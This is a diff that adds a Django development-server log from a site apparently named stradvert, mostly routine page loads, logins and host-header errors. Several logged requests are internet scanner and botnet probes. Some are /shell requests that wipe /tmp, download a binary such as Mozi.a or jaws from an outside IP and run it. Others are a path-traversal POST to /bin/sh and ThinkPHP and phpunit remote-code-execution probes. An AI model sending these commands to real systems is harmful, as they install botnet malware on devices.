@@ -1,0 +1,2728 @@
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 28, 2023 - 06:36:14
+Django version 3.2.6, using settings 'core.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+[28/Mar/2023 06:36:39] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 06:36:39] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[28/Mar/2023 06:36:40] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[28/Mar/2023 06:36:40] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[28/Mar/2023 06:36:40] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 06:36:40] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[28/Mar/2023 06:36:40] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[28/Mar/2023 06:36:40] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[28/Mar/2023 06:36:41] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[28/Mar/2023 06:36:41] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[28/Mar/2023 06:36:41] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[28/Mar/2023 06:36:41] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[28/Mar/2023 06:36:43] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[28/Mar/2023 06:36:43] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 06:36:47] "GET /login/ HTTP/1.1" 200 5163
+[28/Mar/2023 06:37:10] "POST /login/ HTTP/1.1" 302 0
+[28/Mar/2023 06:37:10] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 06:37:12] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[28/Mar/2023 06:37:12] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[28/Mar/2023 06:37:13] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[28/Mar/2023 06:38:52] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 06:38:55] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 06:38:58] "GET /dashboard HTTP/1.1" 200 13215
+[rtsp @ 0x7faf54067380] method SETUP failed: 453 Not Enough Bandwidth
+[28/Mar/2023 06:39:01] "GET /uwtc HTTP/1.1" 200 0
+[rtsp @ 0x7faf3c00acc0] method SETUP failed: 453 Not Enough Bandwidth
+[28/Mar/2023 06:39:03] "GET /naxal HTTP/1.1" 200 0
+[rtsp @ 0x7faf540696c0] method SETUP failed: 453 Not Enough Bandwidth
+[28/Mar/2023 06:39:05] "GET /uwtc HTTP/1.1" 200 0
+[rtsp @ 0x7faf3c02d500] method SETUP failed: 453 Not Enough Bandwidth
+[28/Mar/2023 06:39:07] "GET /naxal HTTP/1.1" 200 0
+[28/Mar/2023 06:39:39] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 06:40:49] "GET /dashboard HTTP/1.1" 200 13215
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+Forbidden (CSRF cookie not set.): /boaform/admin/formLogin
+[28/Mar/2023 07:32:50] "POST /boaform/admin/formLogin HTTP/1.1" 403 2870
+[28/Mar/2023 07:53:18] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 08:04:45] "GET /login/ HTTP/1.1" 200 5163
+Forbidden (CSRF cookie not set.): /boaform/admin/formLogin
+[28/Mar/2023 08:24:20] "POST /boaform/admin/formLogin HTTP/1.1" 403 2870
+[28/Mar/2023 08:27:10] "GET / HTTP/1.1" 200 3497
+Forbidden (CSRF cookie not set.): /HNAP1/
+[28/Mar/2023 08:27:10] "POST /HNAP1/ HTTP/1.1" 403 2870
+[28/Mar/2023 08:27:10,756] - Broken pipe from ('195.178.120.44', 57380)
+
+[28/Mar/2023 08:32:39] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 08:32:39,329] - Broken pipe from ('34.78.249.41', 54398)
+
+[28/Mar/2023 08:33:35] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 08:37:38] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[28/Mar/2023 08:37:41] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 08:37:42] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[28/Mar/2023 08:37:42] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[28/Mar/2023 08:37:42] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[28/Mar/2023 08:37:42] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 08:37:44] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[28/Mar/2023 08:37:44] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[28/Mar/2023 08:37:44] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[28/Mar/2023 08:37:45] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[28/Mar/2023 08:37:46] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[28/Mar/2023 08:37:46] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[28/Mar/2023 08:37:46] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[28/Mar/2023 08:37:47] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[28/Mar/2023 08:37:49] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 08:37:57] "GET /login/ HTTP/1.1" 200 5163
+[28/Mar/2023 09:05:30] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 09:33:28] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 09:33:29,005] - Broken pipe from ('164.90.202.89', 20195)
+
+[28/Mar/2023 09:43:14] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 09:44:36] "GET /favicon.ico HTTP/1.1" 302 0
+[28/Mar/2023 09:45:16] "GET /geoserver/web/ HTTP/1.1" 302 0
+[28/Mar/2023 10:09:19] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 10:30:44] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 10:34:08] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 10:34:09] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[28/Mar/2023 10:34:14] "GET /login/ HTTP/1.1" 200 5163
+[28/Mar/2023 10:34:53] "POST /login/ HTTP/1.1" 302 0
+[28/Mar/2023 10:34:54] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 10:34:56] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[28/Mar/2023 10:34:56] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[28/Mar/2023 10:34:57] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[28/Mar/2023 10:37:35] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 10:37:53] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 10:38:13] "GET /dashboard HTTP/1.1" 200 13215
+[28/Mar/2023 10:38:34] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 11:05:27] "GET //.env HTTP/1.1" 302 0
+[28/Mar/2023 11:05:27] "GET /login/?next=/.env HTTP/1.1" 200 5163
+[28/Mar/2023 11:39:43] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 11:45:15] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 12:36:33] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 12:36:34] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[28/Mar/2023 12:36:35] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 12:55:05] "GET / HTTP/1.1" 400 64729
+[28/Mar/2023 13:24:24] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 13:24:24] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[28/Mar/2023 13:24:24] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[28/Mar/2023 13:24:25] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[28/Mar/2023 13:24:25] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 13:24:25] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[28/Mar/2023 13:24:25] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[28/Mar/2023 13:24:26] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[28/Mar/2023 13:24:26] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[28/Mar/2023 13:24:26] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[28/Mar/2023 13:24:27] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[28/Mar/2023 13:24:30] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[28/Mar/2023 13:24:32] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[28/Mar/2023 13:24:32] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 13:24:33] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[28/Mar/2023 13:24:36] "GET /static/str-logo.png HTTP/1.1" 200 24457
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 13:24:55] "GET / HTTP/1.1" 400 64392
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 13:24:55] "GET / HTTP/1.1" 400 64332
+[28/Mar/2023 13:25:15] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 13:26:14] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 13:32:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+[28/Mar/2023 13:32:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[28/Mar/2023 13:43:00] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 13:51:08,815] - Broken pipe from ('192.155.88.231', 42555)
+
+[28/Mar/2023 13:51:08] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 13:51:08,973] - Broken pipe from ('192.155.88.231', 42556)
+
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[28/Mar/2023 14:03:37] "GET /robots.txt HTTP/1.1" 400 65297
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 14:03:44] "GET / HTTP/1.1" 400 65187
+[28/Mar/2023 14:14:53] "GET / HTTP/1.0" 200 3497
+[28/Mar/2023 14:14:53,447] - Broken pipe from ('45.81.243.34', 55706)
+
+[28/Mar/2023 14:19:48] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+Bad Request: /google.com:443
+[28/Mar/2023 14:33:00] "CONNECT google.com:443 HTTP/1.1" 400 63220
+[28/Mar/2023 14:36:46] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'stradvert.com:443'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /www.sql
+[28/Mar/2023 14:43:58] "GET /www.sql HTTP/1.1" 400 64540
+[28/Mar/2023 14:49:26] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 14:55:39] code 400, message Bad request version ('\x0fÞÒ\x84Ä?1\x9cc\x98_')
+[28/Mar/2023 14:55:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[28/Mar/2023 14:55:42] "OPTIONS / HTTP/1.0" 200 3497
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /.well-known/security.txt
+[28/Mar/2023 15:09:00] "GET /.well-known/security.txt HTTP/1.1" 400 65017
+[28/Mar/2023 15:41:39] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 15:47:37] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 15:47:37] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 15:47:38] "GET /robots.txt HTTP/1.1" 302 0
+[28/Mar/2023 16:08:49] "GET /manager/html HTTP/1.1" 302 0
+[28/Mar/2023 16:10:34] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 16:11:32] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 16:20:30] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /v1/agent/self
+[28/Mar/2023 16:30:50] "GET /v1/agent/self HTTP/1.1" 400 62965
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[28/Mar/2023 17:07:21] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 400 64096
+Invalid HTTP_HOST header: 'localhost:8080'. You may need to add 'localhost' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 17:19:19] "GET / HTTP/1.0" 400 63264
+[28/Mar/2023 17:28:02] "GET / HTTP/1.1" 200 3497
+Forbidden (CSRF cookie not set.): /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[28/Mar/2023 17:42:15] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 403 2870
+[28/Mar/2023 17:50:50] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 0
+[28/Mar/2023 17:50:50] "GET /login/?next=/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 5163
+[28/Mar/2023 17:54:41] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 17:59:17] "GET /solr/admin/info/system?wt=json HTTP/1.1" 302 0
+[28/Mar/2023 17:59:17] "GET /login/?next=/solr/admin/info/system%3Fwt%3Djson HTTP/1.1" 200 5163
+[28/Mar/2023 18:03:01] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 302 0
+[28/Mar/2023 18:03:01] "GET /login/?next=/index.php%3Fs%3D/Index/%255Cthink%255Capp/invokefunction%26function%3Dcall_user_func_array%26vars%5B0%5D%3Dmd5%26vars%5B1%5D%5B%5D%3DHelloThinkPHP21 HTTP/1.1" 200 5163
+[28/Mar/2023 18:05:59] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 18:10:29] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 3497
+[28/Mar/2023 18:43:43] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3497
+[28/Mar/2023 18:53:27] "GET /console/ HTTP/1.1" 302 0
+[28/Mar/2023 18:53:27] "GET /login/?next=/console/ HTTP/1.1" 200 5163
+[28/Mar/2023 18:57:06] "GET / HTTP/1.1" 200 3497
+Forbidden (CSRF cookie not set.): /Autodiscover/Autodiscover.xml
+[28/Mar/2023 19:01:54] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 403 2870
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[28/Mar/2023 19:06:06] "GET /robots.txt HTTP/1.1" 400 64729
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 19:06:07] "GET / HTTP/1.1" 400 65120
+[28/Mar/2023 19:07:48] "GET /_ignition/execute-solution HTTP/1.1" 302 0
+[28/Mar/2023 19:07:48] "GET /login/?next=/_ignition/execute-solution HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 19:08:28] "GET / HTTP/1.1" 400 64805
+[28/Mar/2023 19:17:02] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /wp-login.php
+[28/Mar/2023 19:24:39] "GET /wp-login.php HTTP/1.1" 400 64556
+Forbidden (CSRF cookie not set.): /cgi-bin/../../../../bin/sh
+[28/Mar/2023 19:26:14] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 403 2870
+[28/Mar/2023 19:28:37] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 19:38:28] "GET / HTTP/1.1" 200 3497
+Forbidden (CSRF cookie not set.): /HNAP1/
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 19:53:11] "GET / HTTP/1.1" 400 64830
+[28/Mar/2023 19:59:50] "GET /actuator/gateway/routes HTTP/1.1" 302 0
+[28/Mar/2023 19:59:57] "GET /login/?next=/actuator/gateway/routes HTTP/1.1" 200 5163
+[28/Mar/2023 20:11:37] "GET /geoserver HTTP/1.1" 302 0
+[28/Mar/2023 20:11:37] "GET /login/?next=/geoserver HTTP/1.1" 200 5163
+[28/Mar/2023 20:38:09] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 20:55:13] "GET / HTTP/1.1" 400 64412
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 20:56:47] "GET / HTTP/1.1" 400 64414
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 20:58:02] "GET / HTTP/1.1" 400 64401
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 20:58:04] "GET / HTTP/1.1" 400 64405
+[28/Mar/2023 21:01:29] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 21:19:35,326] - Broken pipe from ('162.142.125.217', 39140)
+
+[28/Mar/2023 21:19:36] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 21:19:36,363] - Broken pipe from ('162.142.125.217', 55164)
+
+[28/Mar/2023 21:19:36] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 21:19:36] code 505, message Invalid HTTP version (2.0)
+[28/Mar/2023 21:19:36] "PRI * HTTP/2.0" 505 -
+[28/Mar/2023 21:19:36] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[28/Mar/2023 21:19:36] "GET /favicon.ico HTTP/1.1" 302 0
+[28/Mar/2023 21:19:36] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 21:22:51] "GET / HTTP/1.1" 400 64418
+[28/Mar/2023 21:26:57] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 302 0
+[28/Mar/2023 23:02:03] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 23:32:00] "GET / HTTP/1.1" 200 3497
+[28/Mar/2023 23:32:11] code 400, message Bad request syntax ('MGLNDD_5.161.208.197_80')
+[28/Mar/2023 23:32:11] "MGLNDD_5.161.208.197_80" 400 -
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 23:34:31] "GET / HTTP/1.1" 400 65820
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 23:34:31] "GET / HTTP/1.1" 400 65822
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 23:34:31] "GET / HTTP/1.1" 400 65759
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Mar/2023 23:34:32] "GET / HTTP/1.1" 400 65761
+[28/Mar/2023 23:50:26] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+[28/Mar/2023 23:50:26] "GET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 400 -
+[29/Mar/2023 00:01:14] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 00:04:49] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 00:47:09] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 00:52:27] "GET / HTTP/1.1" 400 65221
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[29/Mar/2023 00:52:29] "GET /favicon.ico HTTP/1.1" 400 65143
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 00:54:27] "GET / HTTP/1.1" 400 65091
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[29/Mar/2023 00:54:29] "GET /favicon.ico HTTP/1.1" 400 65143
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 01:00:09] "GET / HTTP/1.1" 400 65221
+Invalid HTTP_HOST header: 'stradvert.com'. You may need to add 'stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[29/Mar/2023 01:00:11] "GET /favicon.ico HTTP/1.1" 400 65143
+/var/www/stradvert/stradvert/core/settings.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 29, 2023 - 01:00:26
+Django version 3.2.6, using settings 'core.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+[29/Mar/2023 01:00:34] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 01:00:35] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 01:00:35] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[29/Mar/2023 01:00:35] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 01:00:36] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:00:36] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[29/Mar/2023 01:00:37] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[29/Mar/2023 01:00:49] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:01:08] "POST /login/ HTTP/1.1" 302 0
+[29/Mar/2023 01:01:08] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:01:10] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[29/Mar/2023 01:01:10] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[29/Mar/2023 01:01:10] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[29/Mar/2023 01:01:28] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:01:40] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:01:53] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:01:58] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:02:12] "GET /admin HTTP/1.1" 302 0
+[29/Mar/2023 01:02:25] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:02:30] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:02:38] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:02:42] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:02:47] "GET /logout/ HTTP/1.1" 302 0
+[29/Mar/2023 01:02:47] "GET /dashboard HTTP/1.1" 302 0
+[29/Mar/2023 01:02:48] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[29/Mar/2023 01:03:01] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:03:08] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:03:32] "POST /login/ HTTP/1.1" 302 0
+[29/Mar/2023 01:03:32] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:04:09] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:04:18] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:38] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:39] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:40] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:40] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:40] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:40] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:41] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:41] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:41] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:41] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:04:58] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:05:19] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:05:33] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:05:43] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:05:52] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[29/Mar/2023 01:05:58] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 01:05:59] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:06:03] "GET /login/ HTTP/1.1" 200 5163
